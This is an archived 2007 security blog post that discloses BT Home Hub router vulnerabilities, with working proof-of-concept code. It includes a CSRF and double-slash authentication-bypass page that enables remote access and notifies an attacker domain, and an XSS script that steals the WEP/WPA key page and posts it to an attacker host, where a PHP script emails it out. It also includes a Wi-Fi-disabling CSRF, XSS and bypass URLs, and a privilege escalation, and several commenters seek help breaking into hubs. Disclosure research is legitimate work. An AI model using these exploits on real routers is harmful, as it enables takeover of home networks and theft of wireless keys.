@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>BT Home Flub Pwnin The BT Home Hub (4)</title><meta name="description" content="The following are the full details of the vulnerabilities we reported (BID 25972) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to contact us. All the vulnerabilities and demo exploits discussed below have been tested on version `6.2.2.6` of the firmware, unless otherwise specified. Have fun and be responsible!"><meta property="name" content="BT Home Flub Pwnin The BT Home Hub (4)"><meta itemprop="name" content="BT Home Flub Pwnin The BT Home Hub (4)"><meta property="description" content="The following are the full details of the vulnerabilities we reported (BID 25972) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to contact us. All the vulnerabilities and demo exploits discussed below have been tested on version `6.2.2.6` of the firmware, unless otherwise specified. Have fun and be responsible!"><meta itemprop="description" content="The following are the full details of the vulnerabilities we reported (BID 25972) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to contact us. All the vulnerabilities and demo exploits discussed below have been tested on version `6.2.2.6` of the firmware, unless otherwise specified. Have fun and be responsible!"><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fbt-home-flub-pwnin-the-bt-home-hub-4%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fbt-home-flub-pwnin-the-bt-home-hub-4%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/"><meta property="og:title" content="BT Home Flub Pwnin The BT Home Hub (4)"><meta property="og:description" content="The following are the full details of the vulnerabilities we reported (BID 25972) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to contact us. All the vulnerabilities and demo exploits discussed below have been tested on version `6.2.2.6` of the firmware, unless otherwise specified. Have fun and be responsible!"><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fbt-home-flub-pwnin-the-bt-home-hub-4%2F?w=1024"><meta name="twitter:title" content="BT Home Flub Pwnin The BT Home Hub (4)"><meta name="twitter:description" content="The following are the full details of the vulnerabilities we reported (BID 25972) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to contact us. All the vulnerabilities and demo exploits discussed below have been tested on version `6.2.2.6` of the firmware, unless otherwise specified. Have fun and be responsible!"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fbt-home-flub-pwnin-the-bt-home-hub-4%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">BT Home Flub Pwnin The BT Home Hub (4)</h1><div>Thu, 08 Nov 2007 11:33:13 GMT</div><div id="post-content"><p>The following are the full details of the vulnerabilities we reported (<a href="http://www.securityfocus.com/bid/25972">BID 25972</a>) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to <a href="http://www.gnucitizen.org/contact">contact us</a>. <em>All the vulnerabilities and demo exploits discussed below have been tested on version <code>6.2.2.6</code> of the firmware, unless otherwise specified. Have fun and be responsible!</em></p>
+<h3 id="exploit-1-enable-remote-assistance-and-notify-intruder-when-victim-home-hub-is-owned">Exploit #1: Enable remote assistance and notify intruder when victim Home Hub is owned</h3>
+<p>This is the exploit <a href="/blog/bt-home-flub-pwnin-the-bt-home-hub">shown</a> in our first demo video on which we forge the <strong>enable remote assistance</strong> request using an authentication bypass bug we found within the router firmware. Even if the victim has changed the password, the request will still go through no matter what. After successful exploitation, the attacker is notified via email with the URL (IP address) needed to control the Home Hub remotely.</p>
+<p>In our exploit we set the credentials <strong>tech:12345678</strong>. Notice the double forward slash in the <strong>action</strong> attribute which allows us to bypass the authentication! The exploit Proof of Concept code follows:</p>
+<pre><code>&lt;html&gt;
+&lt;!-- index.html --&gt;
+&lt;head&gt;
+&lt;script&gt;
+
+function redirect() {
+
+       targetURL=&quot;http://www.google.com/search?ie=UTF-8&amp;oe=UTF-8&amp;sourceid=navclient&amp;gfns=1&amp;q=techno+viking&quot;;
+       notifyURL=&quot;http://www.attackersdomain.com/notify.php&quot;;
+       imgsrc = &#39;http://192.168.1.254/images/head_wave.gif&#39;;
+       fingerprint_img = new Image();
+
+       fingerprint_img.onerror = function (evt) {
+               ; //alert(this.src + &quot; can&#39;t be loaded.&quot;);
+       }
+
+       // only notify attacker only if potential vulnerable Thomson
+Speedtouch / BT Homehub router found
+       fingerprint_img.onload = function (evt) {
+               //alert(this.src + &quot; is loaded.&quot;);
+               C=new Image();
+               C.src=notifyURL;
+       }
+
+       fingerprint_img.src = imgsrc;
+       setTimeout(&quot;document.location=targetURL&quot;, 500);
+}
+&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;iframe onload=&quot;redirect()&quot; frameborder=0 height=0 width=0
+src=&quot;./ras.html&quot;&gt;&lt;/iframe&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;html&gt;
+&lt;!-- ras.html --&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+
+&lt;form name=&#39;raccess&#39;
+action=&#39;http://192.168.1.254/cgi/b/ras//?ce=1&amp;be=1&amp;l0=5&amp;l1=5&#39;
+method=&#39;post&#39;&gt;
+&lt;input type=&#39;hidden&#39; name=&#39;0&#39; value=&#39;31&#39;&gt;
+&lt;input type=&#39;hidden&#39; name=&#39;1&#39; value=&#39;&#39;&gt;
+&lt;input type=&#39;hidden&#39; name=&#39;30&#39; value=&#39;12345678&#39;&gt;
+&lt;!-- &lt;input type=&#39;submit&#39; value=&quot;own it!&quot;&gt; --&gt;
+&lt;/form&gt;
+&lt;script&gt;document.raccess.submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+// notify.php
+define(&quot;RCPT_EMAIL&quot;, &quot;bthomehubevil@mailinator.com&quot;);
+define(&quot;EMAIL_SUBJECT&quot;, &quot;[OWNED]&quot;);
+
+$messagebody=&quot;victim: https://&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].&quot;:51003\n&quot;;
+mail(RCPT_EMAIL, EMAIL_SUBJECT, $messagebody);
+?&gt;
+
+### Exploit #2: Steal page containing WEP/WPA key
+
+The following exploit simply steals the WEP/WPA key from the router. In some situations this is all the attackers need. The exploit URL looks like the following:
+
+http://192.168.1.254/cgi/b/ic/connect/?url=&quot;&gt;&lt;script%20src=http://www.attackersdomain.com/xss.js&gt;&lt;/script&gt;&lt;a%20b%3d
+
+// xss.js
+
+// important - won&#39;t work without having a body
+document.write(&quot;&lt;body&gt;&quot;);
+
+// xhr() - WORKS ON BOTH FF2 AND IE7!
+// original code from developer.apple.com
+var req;
+
+// we steal the page that returns the WEP/WPA key. no auth required, can you believe it?
+
+var url=&quot;/cgi/b/_wli_/seccfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=0&quot;;
+
+function loadXMLDoc(url)
+{
+        req = false;
+        // branch for native XMLHttpRequest object
+        if(window.XMLHttpRequest &amp;&amp; !(window.ActiveXObject))
+        {
+                try
+                {
+                        req = new XMLHttpRequest();
+                }
+                catch(e)
+                {
+                        req = false;
+                }
+        // branch for IE/Windows ActiveX version
+        }
+
+        else if(window.ActiveXObject)
+        {
+                try
+                {
+                        req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+                }
+                catch(e)
+                {
+                        try
+                        {
+                                req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+                        }
+                        catch(e)
+                        {
+                                req = false;
+                        }
+                }
+        }
+        if(req)
+        {
+                req.onreadystatechange = processReqChange;
+                req.open(&quot;GET&quot;, url, true);
+                req.send(&quot;&quot;);
+        }
+}
+// end of loadXMLDoc(url)
+
+function processReqChange()
+{
+        // only if req shows &quot;loaded&quot;
+        if (req.readyState == 4)
+        {
+                // only if &quot;OK&quot;
+                if (req.status == 200)
+                {
+                        // ...processing statements go here...
+                        //alert(escape(req.responseText));
+
+                        var f=document.createElement(&quot;form&quot;);
+                        f.name=&quot;myform&quot;;
+                        // where you want the captured data to be submitted to
+                        f.action=&quot;http://evil.domain.foo/bthh/steal.php&quot;;
+                        // POST is handy for submitting large chuncks of data
+                        f.method=&quot;POST&quot;;
+                        var t = document.createElement(&#39;INPUT&#39;);
+                        t.type=&#39;hidden&#39;;
+                        t.name=&#39;data&#39;;
+                        t.value=escape(req.responseText);
+                        f.appendChild(t);
+                        document.body.appendChild(f);
+                        f.submit();
+                }
+        }
+}
+
+loadXMLDoc(url);
+
+// end of body
+document.write(&quot;&lt;/body&gt;&quot;);
+
+&lt;?php
+// steal.php
+define(&quot;RCPT_EMAIL&quot;, &quot;unknown.pentester@gmail.com&quot;);
+define(&quot;EMAIL_SUBJECT&quot;, &quot;[OWNED]&quot;);
+$messagebody=&quot;victim router: &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].&quot;\n&quot;;
+
+if($_REQUEST[&#39;data&#39;]) {
+        $messagebody=$messagebody.&quot;page containing WEP/WPA key:&quot;.$_REQUEST[&#39;data&#39;];
+        mail(RCPT_EMAIL, EMAIL_SUBJECT, $messagebody);
+}
+?&gt;
+
+### Exploit #3: Disable wireless connectivity
+
+This PoC will disable your Wifi permanently unless you re-enable it manually after successful exploitation! In order to re-enable the Wifi interface you can reset to factory settings, or re-enable the setting by connecting to the Home Hub through the ethernet interface. I am not sure what this exploit can be used for but at least it shows a potential quite devastating danger.
+
+&lt;html&gt;
+&lt;!-- index.html --&gt;
+&lt;iframe onload=&quot;javascript:document.body.innerHTML=&#39;&lt;html&gt;&lt;h1&gt;PWNED!&lt;/h1&gt;&#39;&quot; name=&quot;hack&quot; frameborder=0 height=0 width=0 src=&quot;./disable_wifi_interface.html&quot;&gt;&lt;/iframe&gt;
+&lt;/html&gt;
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;!-- disable_wifi_interface.html --&gt;
+
+&lt;!--
+    POST /cgi/b/_wli_/cfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=0&amp;name= HTTP/1.1
+
+    0=10&amp;1=&amp;32=&amp;33=&amp;34=2&amp;35=1&amp;45=11&amp;47=1
+--&gt;
+
+&lt;form action=&quot;http://192.168.1.254/cgi/b/_wli_/cfg//&quot; method=&quot;post&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;0&quot; value=&quot;10&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;1&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;32&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;33&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;34&quot; value=&quot;2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;35&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;45&quot; value=&quot;11&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;47&quot; value=&quot;1&quot;&gt;
+
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+_For the rest of this post we are listing all vulnerabilities that were found in the BT Home Hub router._
+
+### Vulnerability #1: System-wide CSRF
+
+The BT Home Hub is vulnerable to CSRF by design. That means that absolutely ANY request can be forged by an attacker. This includes administrative requests. The only requirement for these attacks to work would be to predict the admin password (many users never change the default admin password), or combine it with a authentication bypass bug like the one we found (more on this later).
+
+As an intruder, you would typically target admin requests that would allow you to compromise the Home Hub. For instance, the following is the request that enables Remote Assistance with a password equals to _PASSW0RD_ (username is **tech**).
+
+POST /cgi/b/ras/?ce=1&amp;be=0&amp;l0=-1&amp;l1=-1 HTTP/1.1
+
+0=31&amp;1=&amp;30=PASSW0RD
+
+_This issue has also been successfully tested on a Thomson Speedtouch 780 (firmware version 6.1.4.3), which is shipped by Bethere in the UK._
+
+### Vulnerability #2: Several non-persistent XSS
+
+There are a few non-persistent XSS. None of them require the victim to be authenticated with the Home Hub for the scripting code (payload) to run. Why is there some functionality/pages available on the web interface without authenticating? Well, don&#39;t ask me! Ask BT or Thomson. Several GET parameters are affected:</code></pre><ul>
+<li><p>Through the <code>name</code> parameter (already published on <a href="http://www.securityfocus.com/bid/16839/exploit">BID 16839</a>):
+  <a href="http://192.168.1.254/cgi/b/intfs/_intf_/ov/?ce=1&amp;be=0&amp;l0=3&amp;l1=1&amp;name=">http://192.168.1.254/cgi/b/intfs/_intf_/ov/?ce=1&amp;be=0&amp;l0=3&amp;l1=1&amp;name=</a><script>alert('XSS')</script></p>
+</li>
+<li><p>Through the <code>url</code> parameter. This one is a good one because there are not restrictions on the length of the payload or type of characters that can be injected. Plus, it works even if the victim is not authenticated (again, the vulnerable script is available without needing to authenticate)
+  <a href="http://192.168.1.254/cgi/b/ic/connect/?nm=1&amp;client=192.168.1.64&amp;server=198.18.1.2&amp;event=DNSSpoofed&amp;url=&quot;&gt;">http://192.168.1.254/cgi/b/ic/connect/?nm=1&amp;client=192.168.1.64&amp;server=198.18.1.2&amp;event=DNSSpoofed&amp;url=&quot;&gt;</a><script>alert('XSS')</script>&lt;a%20b=&quot;
+  <a href="http://192.168.1.254/cgi/b/ic/connect/?nm=1&amp;client=&amp;server=&amp;event=DNSSpoofed&amp;url=&quot;&gt;">http://192.168.1.254/cgi/b/ic/connect/?nm=1&amp;client=&amp;server=&amp;event=DNSSpoofed&amp;url=&quot;&gt;</a><script>alert('XSS')</script>&lt;a%20b=&quot;
+  <a href="http://192.168.1.254/cgi/b/ic/connect/?url=&quot;&gt;">http://192.168.1.254/cgi/b/ic/connect/?url=&quot;&gt;</a><script>alert('XSS')</script>&lt;a%20b=</p>
+<p>  <em>The last PoC URL has also been successfully tested on a Thomson Speedtouch 780 firmware version 6.1.4.3), which is shipped by Bethere in the UK.</em></p>
+<h3 id="vulnerability-3-several-persistent-xss">Vulnerability #3: Several persistent XSS</h3>
+<p>  Persistent XSS on Configuration / Application Sharing / Add new Game or App:</p>
+<p>  <a href="http://192.168.1.254/cgi/b/games/newserv/?ce=1&amp;be=1&amp;l0=4&amp;l1=5&amp;tid=CREATE_GAME">http://192.168.1.254/cgi/b/games/newserv/?ce=1&amp;be=1&amp;l0=4&amp;l1=5&amp;tid=CREATE_GAME</a></p>
+<p>  A request which takes advantage of this vulnerability may look like the following::</p>
+<p>  POST /cgi/b/games/newserv/?ce=1&amp;be=1&amp;l0=4&amp;l1=5&amp;tid=CREATE_GAME HTTP/1.1</p>
+<p>  0=10&amp;1=&amp;30=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscrip&amp;33=0&amp;32=ABC+%28Another+Bittorent+Client%29</p>
+<p>  On the other hand, there is a persistent XSS on the logs page by attempting to authenticate (with the web server) using a malformed username:</p>
+<p>  <a href="http://192.168.1.254/cgi/b/events/?ce=1&amp;be=0&amp;l0=3&amp;l1=-1">http://192.168.1.254/cgi/b/events/?ce=1&amp;be=0&amp;l0=3&amp;l1=-1</a>
+  <a href="http://192.168.1.254/cgi/b/events/">http://192.168.1.254/cgi/b/events/</a></p>
+<p>  Oct 27 16:10:19 LOGIN User <code>[XSS_payload_goes_here]` tried to login on [HTTPS] (from 192.168.1.66)</code></pre></p>
+<p>  The line where the payload is returned looks like the following:</p>
+  <td class='evenrow' align='left' colspan='3'>LOGIN User <BADCHARSHERE> tried to login on [HTTP] (from 192.168.1.66)</td>
+
+<h3 id="vulnerability-4-double-slash-authentication-bypass">Vulnerability #4: Double-slash Authentication Bypass</h3>
+<p>  This authentication bypass allows intruders to view any page that would normally require the admin password. Additionally, <em>any administrative request can be made without requiring the admin password</em>. The bug is extremely simple to exploit, and works like a charm! By simply requesting the password-protected resource with two forward slashes, the authentication is bypassed completely. I.e.:</p>
+</li>
+<li><p>Basic wireless configuration info: <code>http://192.168.1.254/cgi/b/_wli_/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=0</code></p>
+</li>
+<li><p>Local network information: <code>http://192.168.1.254/cgi/b/intfs/_intf_/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=3&amp;name=</code></p>
+</li>
+<li><p>Firewall security settings: <code>http://192.168.1.254/cgi/b/secpol/cfg//</code> and <code>http://192.168.1.254/cgi/b/secpol/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=7</code></p>
+</li>
+<li><p>Internet connection information: <code>http://192.168.1.254/cgi/b/is/_pppoa_/ov//?ce=1&amp;be=1&amp;l0=4&amp;l1=2</code></p>
+</li>
+<li><p>Game and Application sharing: <code>http://192.168.1.254/cgi/b/games/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=5</code> and <code>http://192.168.1.254/cgi/b/games/cfg//</code></p>
+</li>
+<li><p>Remote assistance: <code>http://192.168.1.254/cgi/b/ras//</code></p>
+</li>
+<li><p>Backup and Restore: <code>http://192.168.1.254/cgi/b/bandr//</code></p>
+</li>
+<li><p>_Dump config file_: <code>http://192.168.1.254/cgi/b/backup/user.ini//</code></p>
+<p>  Not only administrative pages can be viewed without a password, but administrative changes can also be made. I.e.: the following request enables remote assistance without requiring a password:</p>
+<p>  POST /cgi/b/ras//?ce=1&amp;be=1&amp;l0=5&amp;l1=5 HTTP/1.1</p>
+<p>  0=31&amp;1=&amp;30=12345678</p>
+<p>  <em>The previous request could be performed by a malicious website through a hidden form as shown in Exploit #1.</em></p>
+<h3 id="vulnerability-5-a-to-c-authentication-bypass">Vulnerability #5: A-to-C authentication bypass</h3>
+<p>  Let me explain what I mean by <em>A-to-C authentication bypass</em>. Sometimes on a application we&#39;re supposed to go through an intermediate B point before we reach C. However, sometimes, knowing C in advance might allow you to gain access to data without going through B. In this case, by simply knowing URLs that would only be accessible to authenticated admin users, an attacker can bypass the password prompt completely.</p>
+<p>  For instance, some pages that are only available after accessing the <em>Advanced</em> section are supposed to require a password to be accessed, but can be accessed without authenticating. i.e.:</p>
+<p>  <a href="http://192.168.1.254/cgi/b/_wli_/seccfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=0">http://192.168.1.254/cgi/b/_wli_/seccfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=0</a></p>
+</li>
+</ul>
+<p>Keep in mind that the WEP/WPA key in the clear. There are other pages whose links can only be seen after authenticating, but can actually be accessed without authenticating by simply accessing the URL directly. However, the Wireless Security page is probably the most interesting one.</p>
+<p><em>BT has finally password-protected the Wireless Security page on firmware version 6.2.6.B.</em></p>
+<h3 id="vulnerability-6-privilege-escalation">Vulnerability #6: Privilege Escalation</h3>
+<p>BT Home Hubs have three accounts by default: <em>Basic_, _admin_, and _tech</em>. Since version 6.2.2.6 of the firmware, saving a backup of the config file and loading a new one is restricted to the <em>tech</em> account which is usually used by BT technical support. However, the <em>admin</em> user can access such functionalities by simply accessing any of the following URLs:</p>
+<ul>
+<li><a href="http://192.168.1.254/cgi/b/backup/user.ini?0=&amp;1=">http://192.168.1.254/cgi/b/backup/user.ini?0=&amp;1=</a></li>
+<li><a href="http://192.168.1.254/cgi/b/backup/user.ini">http://192.168.1.254/cgi/b/backup/user.ini</a></li>
+</ul>
+<p><em>This is pretty much it. I hope that you&#39;ve learned something new. Again, if you have any ideas, suggestions or aditional information, <a href="http://www.gnucitizen.org/contact">contact us</a>.</em></p>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="NurBo"><span>NurBo</span><div class="post-comment-content">whoa nice stuff</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="G-Brain"><span>G-Brain</span><div class="post-comment-content">NurBo reads this stuff? Hehe...
+
+I'd use $_POST['data'] instead of $_REQUEST['data'] in steal.php though. $_REQUEST contains $_GET, $_POST, and $_COOKIE, and all you need here is $_POST. Furthermore, good job! Nice article.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@NurBo - Glad yo like it!
+
+@G-Brain - 'steal.php' is derived from a generic data theft script I wrote long time ago. The idea of the original script is that it works for both, GET and POST, hence the use of $_REQUEST .
+
+btw guys, there is video we're posting soon on this very same page showing a DoS on the BT Home Hub. The exploit takes advantage of the double slash auth bypass + CSRF to disable the wireless connection.
+
+Although I usually don't like DoS attacks, I must say that this one is kind of a killer. Just visit site, and boom, the Home Hub's wireless interface is disabled permanently!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="G-Brain"><span>G-Brain</span><div class="post-comment-content">I see, thanks for the explanation. I don't see why  those definitions of RCPT_EMAIL and EMAIL_SUBJECT are made even when there is no $_REQUEST['data'] though... ;)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@G-Brain - fair enough! I see what you mean, I guess I wasted a few CPU cycles in the script. 
+
+You're right though, if you want to be perfectionist, the definitions on 'steal.php' should be under the IF statement.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">Here is the demo video for Exploit #3 : //www.youtube.com/watch?v=QiFQPKcAtNI</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Rob"><span>Rob</span><div class="post-comment-content">I don't suppose there is an exploit in 6.2.6.B that allows telnet access?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="t3h 1337"><span>t3h 1337</span><div class="post-comment-content">Any 0day for 626c?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="norm"><span>norm</span><div class="post-comment-content">The new Home Hub firmware (6.2.6E) removes these exploits.
+
+However if you gain wireless access to the device (which isn't difficult if it's on WEP) you will find the default password has been changed to the serial number of the device (unless the owner changed it since).
+
+Now you might think getting the serial number would be impossible without physical access, but using the firmware recovery tool provided by BT it will tell you the serial number on finding it. Then all you do is add the two characters 'CP' infront of it to make it valid e.g. CP01234ABCD.
+
+From there I guess the possibility lies with downgrading the firmware to a more vulnerable version.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Noggin"><span>Noggin</span><div class="post-comment-content">I am connected to a BT Home Hub with the WPA2 key (it's a long story how I got that!) and when I browse 192.168.1.254 I get the "Change your admin password for the first time" screen, showing version 8.1.A
+
+I've tried entering the serial number (from the BT Home Hub Admin app plus "CP" in front) but it tells me it is invalid. I have another BT Home Hub and once I've changed the admin password this screen no longer shows.
+
+Any ideas how I can gain access to the admin pages?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Jonnycorer77"><span>Jonnycorer77</span><div class="post-comment-content">Noggin, take a look at the post concerning bypassing the admin password, all you need is there</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Richard Burns"><span>Richard Burns</span><div class="post-comment-content">This all seems pointless, tell me i'm wrong. How can you run any of this unless your on the network? I am surrounded by at least 10 hubs and need to access one of them??</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="JC"><span>JC</span><div class="post-comment-content">The first thing I do with any router is to change its ip address and the range of ips that the lan users can use and turn of dhcp. This would mean your script would have in theory to cover the whole range of private ip addresses from the Wan side and make access from the lan side much more difficult</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="bobp"><span>bobp</span><div class="post-comment-content">Is there any way to reset admin password, other than doing factory reset of router?</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
